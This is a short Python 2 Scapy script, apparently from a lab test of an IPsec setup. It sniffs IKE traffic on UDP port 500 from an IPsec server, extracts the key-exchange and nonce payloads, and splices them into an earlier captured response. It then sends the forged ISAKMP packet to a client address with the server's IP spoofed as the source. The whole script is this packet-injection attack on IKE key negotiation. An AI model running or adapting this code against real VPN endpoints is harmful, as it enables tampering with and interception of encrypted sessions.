#!/usr/local/bin/python
from scapy.all import *
ipsec_server = "192.168.84.128"
ue_addr = "10.0.0.30"

##### Phase 2 #####

# capturing response pk from swan server to UE
packet2=sniff(iface="vmnet8", filter="udp and port 500", count=2)

# storing 2nd response pk from ipsec server
data3 = ""
tlayer3 =packet2[1].getlayer("UDP")	
if packet2[1].getlayer(ISAKMP):	
   data3 += str(tlayer3.payload) #assemble the packet

wrpcap("data3.pcap", packet2[1])  # overall packet 

f = open("raw_data3.dat", 'w')
f.write(data3)
f.close()


#Packetizing data3 + data2
#extracting key and nonce from data3
new_key=""
new_nonce=""
pk = rdpcap("data3.pcap")
new_key=pk[0][ISAKMP].payload.payload.load
new_nonce=pk[0][ISAKMP].payload.payload.payload.load

print "new key"
hexdump(new_key)
print "new nonce"
hexdump(new_nonce)

#replace privious response with extracted key and nonce.
pp=rdpcap("data2.pcap")
#wireshark(pkts)
#pp = ISAKMP(data3)  #payload only
#pp = pkts  #payload only
pp[0]["Raw"].payload.payload.load = new_key
#pp[0]["Raw"].payload.payload.payload.load = new_nonce

print "AFTER new key"
hexdump(pp[0]["Raw"].payload.payload.load)
hexdump(pp[0]["Raw"].payload.payload.load)

wireshark(pp)

#packetizing: original 1st response pkts + new key and nonce
data4 = ""
tlayer =pp[0].getlayer("UDP")	
if pp[0].getlayer("Raw"):	
   data4 += str(pp[0])

#send(IP(dst=ue_addr, src=pp[0][IP].src)/UDP(dport=pp[0].dport)/ISAKMP(data4))

send(IP(dst=ue_addr, src=pp[0][IP].src)/UDP(dport=pp[0].dport)/ISAKMP(data4))

